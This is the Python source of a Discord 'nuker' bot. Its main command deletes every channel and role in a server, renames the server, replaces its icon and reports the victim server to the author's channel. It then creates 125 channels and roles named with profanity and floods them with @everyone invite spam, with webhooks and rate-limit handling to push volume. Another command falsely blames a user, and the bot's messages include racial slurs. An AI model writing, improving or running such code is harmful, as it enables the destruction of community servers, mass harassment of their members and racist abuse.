import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix=";", intents=intents)
client.remove_command("help")

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559

# Whitelist for servers where bot is disabled
whitelisted_servers = set()

# ============================================================
#  RATE LIMIT AWARE SPAMMER
# ============================================================
class RateLimiter:
    def __init__(self, max_requests_per_second=30):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.05
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=25)

async def ultra_spam(channel, message, amount, use_webhooks=True):
    """Ultra-fast spam using webhooks or normal messages."""
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent_count = 0
    semaphore = asyncio.Semaphore(8)
    
    # Try to create a webhook for higher rate limits
    webhook = None
    if use_webhooks:
        try:
            webhook = await channel.create_webhook(name="Blossom Nuker")
        except:
            pass
    
    async def send_one():
        nonlocal sent_count
        async with semaphore:
            try:
                await rate_limiter.wait_if_needed()
                
                if webhook:
                    await webhook.send(message)
                else:
                    await channel.send(message)
                
                sent_count += 1
                return True
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.response.headers.get('Retry-After', 1))
                    await asyncio.sleep(retry_after + 0.1)
                    try:
                        if webhook:
                            await webhook.send(message)
                        else:
                            await channel.send(message)
                        sent_count += 1
                        return True
                    except:
                        return False
                return False
            except Exception:
                return False
    
    # Send in batches to avoid memory issues
    batch_size = 50
    for i in range(0, min(amount, 999), batch_size):
        batch_amount = min(batch_size, amount - i)
        tasks = [asyncio.create_task(send_one()) for _ in range(batch_amount)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.1)
    
    if webhook:
        try:
            await webhook.delete()
        except:
            pass
    
    return sent_count

async def send_invite_spam(channels, amount=9999, concurrency=30):
    """Spam across multiple channels with rate limit awareness."""
    if not channels:
        return
    
    total_sent = 0
    channel_batches = [channels[i:i+5] for i in range(0, len(channels), 5)]
    
    for batch in channel_batches:
        tasks = []
        for channel in batch:
            per_channel_amount = min(amount // max(len(batch), 1), 500)
            tasks.append(asyncio.create_task(ultra_spam(channel, SPAM_MESSAGE, per_channel_amount)))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, int):
                total_sent += r
        
        await asyncio.sleep(0.5)
    
    print(f"[SPAM] Total sent: {total_sent} messages")
    return total_sent

# ============================================================
#  BATCH CHANNEL/ROLE CREATION
# ============================================================
async def batch_create_channels(guild, count=125, name="Fucked By blossom."):
    """Create channels in batches with adaptive delays."""
    channels = []
    batch_size = 5
    delay = 0.8
    
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        tasks = [guild.create_text_channel(name) for _ in range(batch_count)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if not isinstance(r, Exception):
                channels.append(r)
            else:
                if isinstance(r, discord.errors.HTTPException) and r.status == 429:
                    print(f"[RATE LIMIT] Slowing down...")
                    delay = min(delay * 1.5, 5.0)
                    await asyncio.sleep(delay)
        
        if len(results) == batch_count and all(not isinstance(r, Exception) for r in results):
            delay = max(delay * 0.9, 0.5)
        
        await asyncio.sleep(delay)
    
    return channels

async def batch_create_roles(guild, count=125, name="Fucked By blossom."):
    """Create roles in batches with adaptive delays."""
    created = 0
    batch_size = 5
    delay = 0.8
    
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        tasks = [guild.create_role(name=name) for _ in range(batch_count)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if not isinstance(r, Exception):
                created += 1
            else:
                if isinstance(r, discord.errors.HTTPException) and r.status == 429:
                    print(f"[RATE LIMIT] Slowing down...")
                    delay = min(delay * 1.5, 5.0)
                    await asyncio.sleep(delay)
        
        if len(results) == batch_count and all(not isinstance(r, Exception) for r in results):
            delay = max(delay * 0.9, 0.5)
        
        await asyncio.sleep(delay)
    
    return created

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# ============================================================
#  COMMANDS
# ============================================================
@client.command()
async def hiroshima(ctx):
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild

    # --- CHANGE SERVER NAME & ICON ---
    try:
        if not ctx.guild.me.guild_permissions.manage_guild:
            await ctx.send("❌ Missing `manage_guild` permission.")
        else:
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed.")
            
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if image_data[:4] in (b'\x89PNG', b'\xff\xd8\xff', b'GIF8'):
                            await guild.edit(icon=image_data)
                            print("[SUCCESS] Server icon changed.")
                        else:
                            print("[ERROR] Invalid image data.")
                    else:
                        print(f"[ERROR] Failed to download icon: {resp.status}")
    except discord.Forbidden:
        await ctx.send("❌ Bot lacks `manage_guild` permission.")
    except Exception as e:
        print(f"[ERROR] {e}")

    # --- REPORT CHANNEL ---
    report_channel = client.get_channel(REPORT_CHANNEL_ID)
    if report_channel is not None:
        embed = discord.Embed(
            title="Hiroshima command used",
            description=f"A server has been targeted with `;hiroshima`.",
            color=discord.Color.red()
        )
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.add_field(name="Server name", value=guild.name, inline=False)
        embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
        embed.add_field(name="Server ID", value=str(guild.id), inline=False)
        embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.set_footer(text="Blossom Nuker report")
        await report_channel.send(embed=embed)

    # --- DELETE CHANNELS ---
    print("[DELETE] Deleting all channels...")
    for channel in list(guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except Exception as e:
            print(f"[DELETE ERROR] {e}")
    
    # --- DELETE ROLES ---
    print("[DELETE] Deleting all roles...")
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"[DELETE ERROR] {e}")

    # --- CREATE ROLES ---
    print("[CREATE] Creating 125 roles...")
    created_roles = await batch_create_roles(guild, 125, "Fucked By blossom.")
    print(f"[CREATE] Created {created_roles} roles.")

    # --- CREATE CHANNELS ---
    print("[CREATE] Creating 125 channels...")
    channels = await batch_create_channels(guild, 125, "Fucked By blossom.")
    print(f"[CREATE] Created {len(channels)} channels.")

    # --- SPAM ---
    if channels:
        print(f"[SPAM] Starting spam on {len(channels)} channels...")
        await send_invite_spam(channels, amount=9999, concurrency=30)
    else:
        print("[SPAM] No channels to spam!")

@client.command()
async def spaminvite(ctx, amount: int = 25):
    """Spam the invite link across all visible text channels."""
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming `{INVITE_TEXT}` {amount} times per channel...")
    await send_invite_spam(channels, amount=amount, concurrency=20)
    await ctx.send("Invite spam finished.")

@client.command()
async def kicka(ctx, member: discord.Member = None):
    """Kick a specific member, or all bots if no member specified."""
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return

    # If a member is specified, kick them (human or bot)
    if member is not None:
        if member == ctx.author:
            await ctx.send("❌ You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("❌ You can't kick someone with a higher or equal role.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            await ctx.send(f"✅ Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")
        return

    # If no member specified, kick ALL bots (original behavior)
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the `Kick Members` permission to use this command.")
        return

    target_bots = []
    for m in ctx.guild.members:
        if m.bot and m.id != ctx.guild.me.id:
            target_bots.append(m)

    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            kicked += 1
        except Exception:
            failed += 1

    if failed:
        await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")
    else:
        await ctx.send(f"✅ Kicked all {kicked} bot(s).")

@client.command()
async def blame(ctx, member: discord.Member = None):
    """Accuse a user of nuking the server."""
    target = member or ctx.author
    reasons = [
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!"
    ]
    reason = random.choice(reasons)
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed for nuking the server.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    """Display help menu."""
    messages = [
        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
        ctx.send("**[4] ;kicka - Kicks all bots in the server**"),
        ctx.send("**[5] ;blame @user - Accuses someone for nuking the server**"),
        ctx.send("**-------------------------------------------------------------------------**"),
        ctx.send("**[6] ;credits - Shows My Socials  |     [7] ;nothing - nothing left**")
    ]
    await asyncio.gather(*messages)

@client.command()
async def credits(ctx):
    """Show bot credits."""
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command()
async def getbot(ctx):
    """Send a pre-built OAuth2 invite link for this bot."""
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

@client.command()
async def whitelist(ctx, action: str, guild_id: int = None):
    """Whitelist a server to prevent nuking."""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Restricted.")
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command()
async def nothing(ctx):
    """Delete everything in the server."""
    guild = ctx.guild
    for channel in list(guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except:
            pass
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass

# ============================================================
#  RUN THE BOT
# ============================================================
if __name__ == "__main__":
    try:
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
